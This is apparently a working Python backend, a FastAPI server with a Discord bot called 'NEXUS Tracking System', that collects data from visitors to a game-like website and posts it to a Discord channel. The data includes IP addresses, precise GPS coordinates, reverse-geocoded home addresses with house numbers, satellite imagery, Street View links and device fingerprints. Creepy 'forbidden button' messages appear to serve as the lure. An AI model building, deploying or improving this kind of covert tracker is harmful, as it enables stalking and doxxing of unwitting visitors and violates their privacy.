import os
import json
import asyncio
import threading
import math
from datetime import datetime, timedelta
from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse
import discord
from discord.ext import commands
from discord import app_commands, Embed, Color
import uvicorn
from pydantic import BaseModel
from dotenv import load_dotenv
import traceback
import hashlib
import time
from queue import Queue
from threading import Thread
from collections import defaultdict

load_dotenv()

# ==================== CONFIGURATION ====================
BOT_TOKEN = os.getenv('BOT_TOKEN')
DISCORD_CHANNEL_ID = int(os.getenv('DISCORD_CHANNEL_ID', '0'))
PORT = int(os.getenv('PORT', 8000))
FRONTEND_URL = "https://gamef-swart.vercel.app"

if not BOT_TOKEN:
    print("❌ BOT_TOKEN not set in .env")
    exit(1)
if not DISCORD_CHANNEL_ID:
    print("❌ DISCORD_CHANNEL_ID not set in .env")
    exit(1)

# ==================== DATA MODELS ====================
class VisitorInfo(BaseModel):
    ip: str = "N/A"
    city: str = "N/A"
    region: str = "N/A"
    country: str = "N/A"
    timezone: str = "N/A"
    userAgent: str = "N/A"
    screen: dict = {}
    browser: dict = {}
    location: dict = {}
    address: dict = {}
    coordinates: dict = {}
    accuracy: float = 0
    source: str = "Unknown"
    system: dict = {}
    fragments: list = []
    button_presses: int = 0

# ==================== STORAGE WITH DEDUPLICATION ====================
visitors = {}
visits = []
message_queue = Queue()
sent_message_ids = set()  # Track sent message IDs to prevent duplicates
last_visitor_update = {}  # Track last update time per user

# ==================== FASTAPI SETUP ====================
app = FastAPI(title="NEXUS Tracking System")

app.add_middleware(
    CORSMiddleware,
    allow_origins=[FRONTEND_URL, "http://localhost:3000", "*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ==================== DISCORD BOT SETUP ====================
intents = discord.Intents.default()
intents.message_content = True

class NexusBot(commands.Bot):
    def __init__(self):
        super().__init__(command_prefix='!', intents=intents)
        self.channel = None
        self.ready = False
        self.message_queue = Queue()
        self.last_messages = defaultdict(dict)  # Track last message per type per user
        self.message_cooldown = 5  # Cooldown in seconds for same message type

    async def setup_hook(self):
        await self.tree.sync()
        print("✅ Slash commands synced")

    def should_send_message(self, user_id: str, msg_type: str, content_hash: str) -> bool:
        """Check if we should send this message (deduplication logic)"""
        now = time.time()
        
        # Check if we've sent this exact content recently
        if user_id in self.last_messages:
            if msg_type in self.last_messages[user_id]:
                last_sent = self.last_messages[user_id][msg_type]
                # Don't send same message type within cooldown
                if now - last_sent['time'] < self.message_cooldown:
                    # If it's the exact same content, definitely skip
                    if last_sent.get('hash') == content_hash:
                        return False
                    # If it's within cooldown but different content, still wait
                    return False
        
        return True

    def record_message_sent(self, user_id: str, msg_type: str, content_hash: str):
        """Record that we sent a message"""
        self.last_messages[user_id][msg_type] = {
            'time': time.time(),
            'hash': content_hash
        }

    async def process_queue(self):
        """Process messages from the queue with deduplication"""
        while True:
            if not self.message_queue.empty():
                msg = self.message_queue.get()
                try:
                    if msg['type'] == 'embed' and self.channel:
                        embed = msg['data']
                        user_id = msg.get('user_id', 'unknown')
                        
                        # Create a content hash for deduplication
                        content_hash = hashlib.md5(
                            f"{embed.title}{embed.description}{len(embed.fields)}".encode()
                        ).hexdigest()
                        
                        # Check if we should send this message
                        if self.should_send_message(user_id, msg['subtype'], content_hash):
                            await self.channel.send(embed=embed)
                            self.record_message_sent(user_id, msg['subtype'], content_hash)
                            print(f"✅ Sent {msg['subtype']} for user {user_id[:8]}")
                        else:
                            print(f"⏭️ Skipped duplicate {msg['subtype']} for user {user_id[:8]}")
                            
                    elif msg['type'] == 'content' and self.channel:
                        await self.channel.send(content=msg['data'])
                        
                except Exception as e:
                    print(f"❌ Queue send error: {e}")
            await asyncio.sleep(0.1)

bot = NexusBot()

# ==================== DISCORD EVENTS ====================
@bot.event
async def on_ready():
    print(f'✅ Logged in as {bot.user}')
    print(f'📡 Bot ID: {bot.user.id}')
    
    try:
        bot.channel = bot.get_channel(DISCORD_CHANNEL_ID)
        if not bot.channel:
            bot.channel = await bot.fetch_channel(DISCORD_CHANNEL_ID)
        
        bot.ready = True
        print(f'✅ Connected to channel: #{bot.channel.name}')
        
        # Start queue processor
        asyncio.create_task(bot.process_queue())
        
        # Only send startup message if not sent recently
        startup_hash = hashlib.md5(b"startup").hexdigest()
        if bot.should_send_message("system", "startup", startup_hash):
            embed = Embed(
                title="🔮 NEXUS SYSTEM ONLINE",
                description="```Tracking system activated\nWaiting for targets...```",
                color=Color.green(),
                timestamp=datetime.now()
            )
            embed.add_field(name="Status", value="✅ Active", inline=True)
            embed.add_field(name="Channel", value=f"#{bot.channel.name}", inline=True)
            embed.add_field(name="Frontend", value=f"[Website]({FRONTEND_URL})", inline=True)
            
            await bot.channel.send(embed=embed)
            bot.record_message_sent("system", "startup", startup_hash)
            print("✅ Startup message sent")
        
    except Exception as e:
        print(f'❌ Error: {e}')

# ==================== SATELLITE IMAGE FUNCTION ====================
def get_satellite_url(lat: float, lon: float):
    """Get satellite image URL for coordinates"""
    zoom = 18
    x = int((lon + 180) / 360 * (2 ** zoom))
    y = int((1 - math.log(math.tan(math.radians(lat)) + 1 / math.cos(math.radians(lat))) / math.pi) / 2 * (2 ** zoom))
    return f"https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{zoom}/{y}/{x}"

# ==================== EMBED CREATION FUNCTIONS ====================
def create_location_embed(user_id: str, data: dict, ip: str):
    """Create location embed"""
    coords = data.get('coordinates', {})
    addr = data.get('address', {})
    loc = data.get('location', {})
    
    if not coords:
        return None
    
    lat = coords.get('lat')
    lon = coords.get('lon')
    
    embed = Embed(
        title="📍 EXACT LOCATION TRACKED",
        color=Color.red(),
        timestamp=datetime.now()
    )
    
    embed.add_field(name="👤 User ID", value=f"`{user_id[:8]}`", inline=True)
    embed.add_field(name="🌐 IP", value=f"`{ip}`", inline=True)
    embed.add_field(name="📡 Source", value=f"`{data.get('source', 'GPS')}`", inline=True)
    embed.add_field(name="🎯 Accuracy", value=f"`{data.get('accuracy', '?')}m`", inline=True)
    
    embed.add_field(
        name="📍 Coordinates",
        value=f"```\nLatitude:  {lat:.6f}\nLongitude: {lon:.6f}```",
        inline=False
    )
    
    if loc.get('display_name'):
        embed.add_field(
            name="🏠 EXACT ADDRESS",
            value=f"```{loc.get('display_name')}```",
            inline=False
        )
    
    details = []
    if addr.get('house_number'): 
        details.append(f"🏠 **House:** {addr.get('house_number')}")
    if addr.get('road'): 
        details.append(f"🛣️ **Road:** {addr.get('road')}")
    if addr.get('neighbourhood'): 
        details.append(f"🏘️ **Neighbourhood:** {addr.get('neighbourhood')}")
    if addr.get('suburb'): 
        details.append(f"🏘️ **Suburb:** {addr.get('suburb')}")
    if addr.get('city') or addr.get('town') or addr.get('village'): 
        city = addr.get('city') or addr.get('town') or addr.get('village')
        details.append(f"🏙️ **City:** {city}")
    if addr.get('county'): 
        details.append(f"🗺️ **County:** {addr.get('county')}")
    if addr.get('state'): 
        details.append(f"📍 **State:** {addr.get('state')}")
    if addr.get('postcode'): 
        details.append(f"📮 **ZIP:** {addr.get('postcode')}")
    if addr.get('country'): 
        details.append(f"🌍 **Country:** {addr.get('country')}")
    
    if details:
        embed.add_field(name="📋 Location Details", value="\n".join(details), inline=False)
    
    maps_url = f"https://www.google.com/maps?q={lat},{lon}"
    street_url = f"https://www.google.com/maps?q={lat},{lon}&layer=c"
    
    embed.add_field(name="🗺️ Google Maps", value=f"[Open in Maps]({maps_url})", inline=True)
    embed.add_field(name="📸 Street View", value=f"[View Street]({street_url})", inline=True)
    
    return embed

def create_satellite_embed(user_id: str, data: dict):
    """Create satellite embed"""
    coords = data.get('coordinates', {})
    addr = data.get('address', {})
    
    if not coords:
        return None
    
    lat = coords.get('lat')
    lon = coords.get('lon')
    satellite_url = get_satellite_url(lat, lon)
    
    embed = Embed(
        title="🛰️ SATELLITE IMAGERY",
        description=f"**Location:** {lat:.6f}, {lon:.6f}",
        color=Color.blue(),
        timestamp=datetime.now()
    )
    embed.set_image(url=satellite_url)
    
    location_context = []
    if addr.get('city') or addr.get('town'):
        location_context.append(addr.get('city') or addr.get('town'))
    if addr.get('state'):
        location_context.append(addr.get('state'))
    if addr.get('country'):
        location_context.append(addr.get('country'))
    
    if location_context:
        embed.add_field(name="Location", value=", ".join(location_context), inline=True)
    
    embed.add_field(name="Zoom Level", value="`18`", inline=True)
    embed.add_field(name="Source", value="ESRI World Imagery", inline=True)
    
    return embed

def create_system_embed(user_id: str, data: dict, ip: str):
    """Create system info embed"""
    sys = data.get('system', {})
    browser = data.get('browser', {})
    
    embed = Embed(
        title="💻 SYSTEM FINGERPRINT",
        color=Color.blue(),
        timestamp=datetime.now()
    )
    
    embed.add_field(name="👤 User ID", value=f"`{user_id[:8]}`", inline=True)
    embed.add_field(name="🌐 IP", value=f"`{ip}`", inline=True)
    embed.add_field(name="💿 Platform", value=f"`{sys.get('platform', '?')}`", inline=True)
    embed.add_field(name="⚡ CPU Cores", value=f"`{sys.get('cores', '?')}`", inline=True)
    embed.add_field(name="💾 RAM", value=f"`{sys.get('memory', '?')}`", inline=True)
    
    screen = sys.get('screen', {})
    if isinstance(screen, dict):
        screen_size = f"{screen.get('width', '?')}x{screen.get('height', '?')}"
    else:
        screen_size = str(screen)
    embed.add_field(name="📺 Screen", value=f"`{screen_size}`", inline=True)
    
    embed.add_field(name="⏰ Timezone", value=f"`{data.get('timezone', '?')}`", inline=True)
    embed.add_field(name="🗣️ Language", value=f"`{browser.get('language', '?')}`", inline=True)
    
    fingerprint = hashlib.md5(
        f"{sys.get('platform')}{data.get('timezone')}{sys.get('cores')}".encode()
    ).hexdigest()[:8]
    embed.add_field(name="🆔 Fingerprint", value=f"`{fingerprint}`", inline=False)
    
    return embed

def create_new_visitor_embed(user_id: str, data: dict, ip: str):
    """Create new visitor embed"""
    embed = Embed(
        title="🎯 NEW VISITOR DETECTED",
        color=Color.purple(),
        timestamp=datetime.now()
    )
    
    embed.add_field(name="👤 User ID", value=f"`{user_id[:8]}`", inline=True)
    embed.add_field(name="🌐 IP", value=f"`{ip}`", inline=True)
    embed.add_field(name="📍 Location", value=f"{data.get('city', 'N/A')}, {data.get('country', 'N/A')}", inline=True)
    
    sys = data.get('system', {})
    embed.add_field(name="💻 Platform", value=f"`{sys.get('platform', 'N/A')}`", inline=True)
    
    today = datetime.now().strftime('%Y-%m-%d')
    today_count = len([v for v in visitors.values() if v.get('first_seen', '').startswith(today)])
    
    embed.set_footer(text=f"Today's visitors: {today_count}")
    
    return embed

def create_button_embed(user_id: str, presses: int, ip: str):
    """Create button press embed"""
    embed = Embed(
        title="🚫 FORBIDDEN BUTTON PRESSED",
        color=Color.dark_red(),
        timestamp=datetime.now()
    )
    
    embed.add_field(name="👤 User ID", value=f"`{user_id[:8]}`", inline=True)
    embed.add_field(name="🔢 Press Count", value=f"`{presses}`", inline=True)
    embed.add_field(name="🌐 IP", value=f"`{ip}`", inline=True)
    
    messages = [
        "Why did you do that?",
        "They're watching now.",
        "The button knows.",
        "Check your surroundings.",
        "Only 5 presses left...",
        "You shouldn't have done that.",
        "They know your name.",
        "It's too late now.",
        "The screen is glitching.",
        "Behind you."
    ]
    
    if presses <= len(messages):
        embed.add_field(name="💬 Message", value=f"```{messages[presses-1]}```", inline=False)
    
    if presses in [3, 6, 9]:
        embed.add_field(name="⚠️ EVENT", value="Reality fragment discovered!", inline=False)
    
    if presses == 9:
        embed.add_field(name="🔓 SECRET", value="Coordinates revealed: `60.233, 24.866`", inline=False)
    
    return embed

def create_fragment_embed(user_id: str, fragment: int, total: int, ip: str):
    """Create fragment embed"""
    embed = Embed(
        title="🧩 REALITY FRAGMENT FOUND",
        color=Color.green(),
        timestamp=datetime.now()
    )
    
    embed.add_field(name="👤 User ID", value=f"`{user_id[:8]}`", inline=True)
    embed.add_field(name="🧩 Fragment", value=f"`{fragment}/9`", inline=True)
    embed.add_field(name="📊 Progress", value=f"`{total}/9`", inline=True)
    embed.add_field(name="🌐 IP", value=f"`{ip}`", inline=True)
    
    progress = "▓" * total + "░" * (9 - total)
    embed.add_field(name="📈 Collection", value=f"`{progress}`", inline=False)
    
    return embed

def create_summary_embed(user_id: str, data: dict, ip: str):
    """Create summary embed"""
    embed = Embed(
        title=f"📊 VISITOR SUMMARY",
        color=Color.gold(),
        timestamp=datetime.now()
    )
    
    embed.add_field(name="👤 User ID", value=f"`{user_id[:8]}`", inline=True)
    embed.add_field(name="🌐 IP", value=f"`{ip}`", inline=True)
    embed.add_field(name="📍 Location", value=f"{data.get('city', 'N/A')}, {data.get('country', 'N/A')}", inline=True)
    
    if data.get('coordinates'):
        coords = data.get('coordinates', {})
        embed.add_field(
            name="📍 Coordinates", 
            value=f"`{coords.get('lat', '?')}, {coords.get('lon', '?')}`", 
            inline=True
        )
    
    sys = data.get('system', {})
    embed.add_field(
        name="💻 System", 
        value=f"`{sys.get('platform', 'N/A')}`", 
        inline=True
    )
    
    if data.get('button_presses', 0) > 0:
        embed.add_field(name="🚫 Button", value=f"`{data.get('button_presses')} presses`", inline=True)
    
    fragments = data.get('fragments', [])
    if fragments:
        embed.add_field(name="🧩 Fragments", value=f"`{len(fragments)}/9`", inline=True)
    
    addr = data.get('address', {})
    if addr.get('city') or addr.get('country'):
        location_parts = []
        if addr.get('city'): location_parts.append(addr.get('city'))
        if addr.get('state'): location_parts.append(addr.get('state'))
        if addr.get('country'): location_parts.append(addr.get('country'))
        embed.add_field(name="📍 Location", value=", ".join(location_parts), inline=True)
    
    embed.set_footer(text=f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    
    return embed

# ==================== FASTAPI ENDPOINTS ====================
@app.get("/")
async def root():
    return {
        "name": "NEXUS Tracking System",
        "status": "online",
        "bot_ready": bot.ready,
        "frontend": FRONTEND_URL,
        "channel_id": DISCORD_CHANNEL_ID
    }

@app.get("/api/health")
async def health():
    return {
        "status": "online",
        "bot_ready": bot.ready,
        "timestamp": datetime.now().isoformat()
    }

@app.post("/submit")
async def submit_visitor(request: Request, visitor: VisitorInfo):
    """Receive visitor data and queue for Discord"""
    try:
        data = visitor.dict()
        client_ip = request.client.host
        
        print(f"📥 Received data from {client_ip}")
        print(f"📍 City: {data.get('city')}, Country: {data.get('country')}")
        
        # Generate user ID
        user_id = hashlib.sha256(f"{client_ip}_{data.get('userAgent', '')}".encode()).hexdigest()[:16]
        
        # Check if new user
        is_new = user_id not in visitors
        
        # Store in memory
        if is_new:
            visitors[user_id] = {
                'first_seen': datetime.now().isoformat(),
                'ip': client_ip,
                'city': data.get('city'),
                'country': data.get('country')
            }
        
        visits.append({
            'user_id': user_id,
            'timestamp': datetime.now().isoformat(),
            'data': data
        })
        
        # Queue messages for Discord with deduplication (non-blocking)
        if bot.ready and bot.channel:
            # Queue new visitor embed (only if new)
            if is_new:
                embed = create_new_visitor_embed(user_id, data, client_ip)
                if embed:
                    bot.message_queue.put({
                        'type': 'embed', 
                        'subtype': 'new_visitor',
                        'user_id': user_id,
                        'data': embed
                    })
            
            # Queue location and satellite embeds (only if coordinates exist and not sent recently)
            if data.get('coordinates'):
                # Only send location embed if not sent in last 30 seconds for this user
                loc_embed = create_location_embed(user_id, data, client_ip)
                if loc_embed:
                    bot.message_queue.put({
                        'type': 'embed', 
                        'subtype': 'location',
                        'user_id': user_id,
                        'data': loc_embed
                    })
                
                sat_embed = create_satellite_embed(user_id, data)
                if sat_embed:
                    bot.message_queue.put({
                        'type': 'embed', 
                        'subtype': 'satellite',
                        'user_id': user_id,
                        'data': sat_embed
                    })
            
            # Queue system embed (only once per session)
            if data.get('system') and is_new:
                sys_embed = create_system_embed(user_id, data, client_ip)
                if sys_embed:
                    bot.message_queue.put({
                        'type': 'embed', 
                        'subtype': 'system',
                        'user_id': user_id,
                        'data': sys_embed
                    })
            
            # Queue button press embeds (only if button presses increased)
            if data.get('button_presses', 0) > 0:
                # Check if button press count increased
                last_presses = last_visitor_update.get(user_id, {}).get('button_presses', 0)
                if data.get('button_presses') > last_presses:
                    btn_embed = create_button_embed(user_id, data.get('button_presses'), client_ip)
                    if btn_embed:
                        bot.message_queue.put({
                            'type': 'embed', 
                            'subtype': 'button',
                            'user_id': user_id,
                            'data': btn_embed
                        })
            
            # Queue fragment embeds (only for new fragments)
            fragments = data.get('fragments', [])
            if fragments:
                last_fragments = last_visitor_update.get(user_id, {}).get('fragments', [])
                new_fragments = [f for f in fragments if f not in last_fragments]
                
                for fragment in new_fragments:
                    frag_embed = create_fragment_embed(user_id, fragment, len(fragments), client_ip)
                    if frag_embed:
                        bot.message_queue.put({
                            'type': 'embed', 
                            'subtype': 'fragment',
                            'user_id': user_id,
                            'data': frag_embed
                        })
            
            # Queue summary embed (only if something changed)
            last_update = last_visitor_update.get(user_id, {})
            
            # Check if anything changed
            changed = (
                data.get('button_presses', 0) != last_update.get('button_presses', 0) or
                len(data.get('fragments', [])) != len(last_update.get('fragments', [])) or
                is_new
            )
            
            if changed:
                summary_embed = create_summary_embed(user_id, data, client_ip)
                if summary_embed:
                    bot.message_queue.put({
                        'type': 'embed', 
                        'subtype': 'summary',
                        'user_id': user_id,
                        'data': summary_embed
                    })
            
            # Update last visitor data
            last_visitor_update[user_id] = {
                'button_presses': data.get('button_presses', 0),
                'fragments': data.get('fragments', []),
                'timestamp': time.time()
            }
            
            print(f"✅ Queued messages for user {user_id[:8]}")
        else:
            print(f"⚠️ Bot not ready - skipping Discord messages")
        
        return JSONResponse({
            "status": "success", 
            "user_id": user_id, 
            "is_new": is_new
        })
        
    except Exception as e:
        print(f"❌ Error: {e}")
        traceback.print_exc()
        return JSONResponse({"error": str(e)}, status_code=500)

# ==================== SLASH COMMANDS ====================
@bot.tree.command(name="stats", description="Get tracking statistics")
async def stats(interaction: discord.Interaction):
    await interaction.response.defer()
    
    total_users = len(visitors)
    total_visits = len(visits)
    queue_size = bot.message_queue.qsize()
    
    today = datetime.now().strftime('%Y-%m-%d')
    today_visits = len([v for v in visits if v['timestamp'].startswith(today)])
    
    embed = Embed(
        title="📊 NEXUS STATISTICS",
        color=Color.purple(),
        timestamp=datetime.now()
    )
    
    embed.add_field(name="Total Users", value=f"`{total_users}`", inline=True)
    embed.add_field(name="Total Visits", value=f"`{total_visits}`", inline=True)
    embed.add_field(name="Today's Visits", value=f"`{today_visits}`", inline=True)
    embed.add_field(name="Queue Size", value=f"`{queue_size}`", inline=True)
    
    await interaction.followup.send(embed=embed)

@bot.tree.command(name="recent", description="Show recent locations")
@app_commands.describe(limit="Number of locations to show (default: 5)")
async def recent(interaction: discord.Interaction, limit: int = 5):
    await interaction.response.defer()
    
    # Deduplicate by user_id and only show most recent per user
    seen_users = set()
    unique_locations = []
    
    for visit in reversed(visits):
        if visit['user_id'] not in seen_users and visit['data'].get('coordinates'):
            seen_users.add(visit['user_id'])
            unique_locations.append(visit)
            if len(unique_locations) >= limit:
                break
    
    if not unique_locations:
        await interaction.followup.send("No locations found")
        return
    
    embed = Embed(
        title=f"📍 RECENT LOCATIONS (Last {len(unique_locations)} unique users)",
        color=Color.blue(),
        timestamp=datetime.now()
    )
    
    for loc in unique_locations:
        coords = loc['data'].get('coordinates', {})
        addr = loc['data'].get('address', {})
        
        location_text = addr.get('city') or f"{coords.get('lat', '?')}, {coords.get('lon', '?')}"
        time_ago = datetime.fromisoformat(loc['timestamp'])
        mins_ago = int((datetime.now() - time_ago).total_seconds() / 60)
        
        embed.add_field(
            name=f"User {loc['user_id'][:8]} - {mins_ago}m ago",
            value=f"```{location_text[:50]}```",
            inline=False
        )
    
    await interaction.followup.send(embed=embed)

@bot.tree.command(name="queue", description="Show queue status")
async def queue_status(interaction: discord.Interaction):
    queue_size = bot.message_queue.qsize()
    await interaction.response.send_message(f"📊 Queue has `{queue_size}` messages waiting")

@bot.tree.command(name="help", description="Show all available commands")
async def help_command(interaction: discord.Interaction):
    embed = Embed(
        title="🔮 NEXUS COMMANDS",
        description="Here are all available slash commands:",
        color=Color.purple()
    )
    
    commands = [
        "`/stats` - View tracking statistics",
        "`/recent [limit]` - Show recent locations (deduplicated)",
        "`/queue` - Show message queue status",
        "`/help` - Show this message"
    ]
    
    embed.add_field(name="Commands", value="\n".join(commands), inline=False)
    embed.set_footer(text="NEXUS Tracking System v2.1 - With deduplication")
    
    await interaction.response.send_message(embed=embed)

# ==================== STARTUP ====================
def run_bot():
    """Run bot in a separate thread with its own event loop"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    async def start_bot():
        try:
            await bot.start(BOT_TOKEN)
        except Exception as e:
            print(f"❌ Bot error: {e}")
    
    loop.run_until_complete(start_bot())

@app.on_event("startup")
async def startup_event():
    """Start Discord bot thread"""
    thread = Thread(target=run_bot, daemon=True)
    thread.start()
    print("✅ Discord bot thread started")

# ==================== RUN ====================
if __name__ == "__main__":
    print("=" * 50)
    print("🔮 NEXUS TRACKING SYSTEM")
    print("=" * 50)
    print(f"📡 Bot Token: {BOT_TOKEN[:10]}..." if BOT_TOKEN else "❌ No token")
    print(f"📡 Channel ID: {DISCORD_CHANNEL_ID}")
    print(f"🌐 Frontend: {FRONTEND_URL}")
    print(f"💻 Status: Online")
    print("=" * 50)
    
    uvicorn.run(app, host="0.0.0.0", port=PORT)
